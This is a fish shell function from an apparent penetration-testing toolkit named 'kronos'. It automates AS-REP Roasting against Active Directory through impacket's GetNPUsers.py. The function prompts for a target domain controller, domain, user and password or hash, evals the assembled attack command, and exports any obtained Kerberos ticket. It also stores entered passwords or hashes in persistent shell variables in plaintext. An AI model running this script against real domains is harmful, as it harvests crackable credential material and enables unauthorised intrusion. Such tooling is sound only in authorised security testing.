# description: Run AS-REP Roasting using GetNPUsers.py
function __kronos_asrep_roast --description "Run AS-REP Roasting using GetNPUsers.py"
    set -l wizard 0
    if test (count $argv) -eq 0
        set wizard 1
    end

    argparse h/help u/username= d/domain= k/kerberos X/edit-cmd q/quiet t/target= w/wizard -- $argv
    or return 1

    if set -q _flag_help
        echo "Usage: kronos asrep-roast [OPTIONS]"
        echo ""
        echo "Run AS-REP Roasting using impacket's GetNPUsers.py."
        echo ""
        echo "Options:"
        echo "  -t, --target IP     Target IP or Hostname"
        echo "  -u, --username USER Provide username (falls back to \$TGT_CRED_USERNAME)"
        echo "  -d, --domain DOMAIN Target domain name (falls back to \$TGT_DC_DOMAIN)"
        echo "  -k, --kerberos      Use Kerberos authentication"
        echo "  -X, --edit-cmd      Inspect and edit the command before execution"
        echo "  -q, --quiet         Skip prompts and use cached/default values"
        echo "  -h, --help          Show this help message"
        return 0
    end

    set -l target $_flag_target
    if test -z "$target"; set target $argv[1]; end
    set -l domain $_flag_domain
    set -l user $_flag_username

    if not set -q _flag_quiet
        if test "$wizard" -eq 1 -o -z "$target"; or set -q _flag_wizard
            set_color cyan; echo "[*] Starting AS-REP Roast wizard..."; set_color normal

            set -l def_target "$__KRONOS_CACHE_ASREP_TARGET"
            set -l src_target "Cache"
            if test -z "$def_target"
                set def_target "$TGT"; set src_target "TGT"
                if test -z "$def_target"; set def_target "$TGT_DC_IP"; set src_target "TGT_DC_IP"; end
                if test -z "$def_target"; set def_target "$TGT_DC"; set src_target "TGT_DC"; end
                if test -z "$def_target"; set def_target "$TGT_HOSTS[1]"; set src_target "TGT_HOSTS"; end
            end
            if test -n "$target"; set def_target "$target"; set src_target "CLI Arg"; end
            set target (__kronos_ask "Target DC IP/Hostname" "$def_target" "$src_target"); or return 1
            set -U __KRONOS_CACHE_ASREP_TARGET "$target"

            set -l def_domain "$__KRONOS_CACHE_ASREP_DOMAIN"
            set -l src_domain "Cache"
            if test -z "$def_domain"
                set def_domain "$TGT_HOSTS[1]"; set src_domain "TGT_HOSTS"
                if test -z "$def_domain"; set def_domain "$TGT_DC_DOMAIN"; set src_domain "TGT_DC_DOMAIN"; end
            end
            if test -n "$domain"; set def_domain "$domain"; set src_domain "CLI Arg"; end
            set domain (__kronos_ask "Domain Name" "$def_domain" "$src_domain"); or return 1
            set -U __KRONOS_CACHE_ASREP_DOMAIN "$domain"

            set -l def_user "$__KRONOS_CACHE_ASREP_USER"
            set -l src_user "Cache"
            if test -z "$def_user"
                set def_user "$TGT_USERNAME"; set src_user "TGT_USERNAME"
                if test -z "$def_user"; set def_user "$TGT_CRED_USERNAME"; set src_user "TGT_CRED_USERNAME"; end
            end
            if test -n "$user"; set def_user "$user"; set src_user "CLI Arg"; end
            set user (__kronos_ask "User to Roast" "$def_user" "$src_user"); or return 1
            set -U __KRONOS_CACHE_ASREP_USER "$user"

            if not set -q _flag_kerberos
                set -l def_auth_val "$__KRONOS_CACHE_ASREP_AUTH_VAL"
                set -l src_auth_val "Cache"
                if test -z "$def_auth_val"
                    set def_auth_val "$TGT_PASSWORD"; set src_auth_val "TGT_PASSWORD"
                    if test -z "$def_auth_val"; set def_auth_val "$TGT_CRED_PASSWORD"; set src_auth_val "TGT_CRED_PASSWORD"; end
                end
                set -l auth_input (__kronos_ask "Auth Password or Hash" "$def_auth_val" "$src_auth_val"); or return 1
                set -U __KRONOS_CACHE_ASREP_AUTH_VAL "$auth_input"
            end
        end
    else
        # Quiet mode fallbacks
        if test -z "$target"; set target "$__KRONOS_CACHE_ASREP_TARGET"; end
        if test -z "$target"; set target $TGT; end
        if test -z "$domain"; set domain "$__KRONOS_CACHE_ASREP_DOMAIN"; end
        if test -z "$user"; set user "$__KRONOS_CACHE_ASREP_USER"; end
        if test -z "$user"; set user "$TGT_USERNAME"; end
    end
    
    if test -z "$target"; echo "error: target is required"; return 1; end
    if test -z "$domain"; echo "error: domain is required"; return 1; end
    if test -z "$user"; echo "error: username is required"; return 1; end

    set -l impacket_cmd ""
    if command -v GetNPUsers.py >/dev/null
        set impacket_cmd GetNPUsers.py
    else if command -v impacket-GetNPUsers >/dev/null
        set impacket_cmd impacket-GetNPUsers
    else
        echo "error: GetNPUsers not found. run 'kronos install'."; return 1; end

    set -l roast_cmd "$impacket_cmd \"$domain/$user\" -dc-ip \"$target\" -no-pass -request"
    if set -q _flag_kerberos
        set roast_cmd "$roast_cmd -k"
    end

    if set -q _flag_edit_cmd
        set roast_cmd (__kronos_edit_cmd "$roast_cmd"); or return 1
    end

    __kronos_check_dep $impacket_cmd; or return 1
    echo "[*] Running $impacket_cmd against $target for user $user@$domain..."
    eval $roast_cmd

    # Export ticket if generated
    if test -f "$user.ccache"
        set -gx KRB5CCNAME "$PWD/$user.ccache"
        echo "[+] Ticket saved and exported to KRB5CCNAME=$KRB5CCNAME"
    end
end
